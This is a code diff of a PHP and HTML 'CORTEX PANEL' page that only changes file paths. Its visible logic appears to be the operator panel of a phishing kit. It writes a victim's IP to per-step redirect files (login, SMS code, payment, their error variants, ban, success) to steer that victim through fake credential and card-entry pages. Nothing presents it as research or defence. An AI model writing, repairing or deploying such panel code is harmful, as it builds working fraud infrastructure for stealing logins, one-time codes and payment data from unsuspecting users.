@@ -32,7 +32,7 @@ if (isset($_GET['query']) && $_GET['query'] == 'user_info') {
 
 
 if (isset($_GET['query']) && $_GET['query'] == 'redirect_status') {
-    $redirect_file = '../redirect/payment.txt';
+    $redirect_file = 'payment.txt';
     $status = 'No redirect set';
     if (file_exists($redirect_file)) {
         $content = trim(file_get_contents($redirect_file));
@@ -46,34 +46,34 @@ if (isset($_GET['query']) && $_GET['query'] == 'redirect_status') {
 
 switch ($step) {
     case 'ban':
-        writeOnFile("../blacklist/ban.txt", $ip);
+        writeOnFile("ban.txt", $ip);
         break;
     case 'info':
-        writeOnFile("../redirect/info.txt", $ip);
+        writeOnFile("info.txt", $ip);
         break;
     case 'info-err':
-        writeOnFile("../redirect/infoerr.txt", $ip);
+        writeOnFile("infoerr.txt", $ip);
         break;
     case 'login':
-        writeOnFile("../redirect/login.txt", $ip);
+        writeOnFile("login.txt", $ip);
         break;
     case 'login-err':
-        writeOnFile("../redirect/loginerr.txt", $ip);
+        writeOnFile("loginerr.txt", $ip);
         break;
     case 'sms':
-        writeOnFile("../redirect/sms.txt", $ip);
+        writeOnFile("sms.txt", $ip);
         break;
     case 'sms-err':
-        writeOnFile("../redirect/smserr.txt", $ip); 
+        writeOnFile("smserr.txt", $ip); 
         break;
     case 'payment':
-        writeOnFile("../redirect/payment.txt", $ip);
+        writeOnFile("payment.txt", $ip);
         break;
     case 'payment-err':
-        writeOnFile("../redirect/paymenterr.txt", $ip); 
+        writeOnFile("paymenterr.txt", $ip); 
         break;
     case 'success':
-        writeOnFile("../redirect/success.txt", $ip);
+        writeOnFile("success.txt", $ip);
         break;
     default:
         break;
@@ -92,8 +92,8 @@ echo "No valid query specified.";
     <meta name="description" content="particles.js is a lightweight JavaScript library for creating particles.">
     <meta name="author" content="Vincent Garreau" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="stylesheet" media="screen" href="./files/css/stye.css">
-    <link rel="shortcut icon" href="./files/media/logo.png" type="image/x-icon">
+    <link rel="stylesheet" media="screen" href="stye.css">
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
 </head>
 <body style="font-family: 'Arvo', serif;">
 
@@ -148,7 +148,7 @@ span {
 
 <div id="particles-js" style="color: aliceblue;position: relative;">
 <header style="position: absolute;flex-direction: column;">
-<img src="./files/media/logo.png" alt="" width="90px">
+<img src="logo.png" alt="" width="90px">
 <h1>CORTEX PANEL</h1>
 </header>
 
@@ -161,8 +161,8 @@ span {
 </main>
 </div>
 
-<script src="./files/js/particles.js"></script>
-<script src="./files/js/app.js"></script>
+<script src="particles.js"></script>
+<script src="app.js"></script>
 
 
 </body>
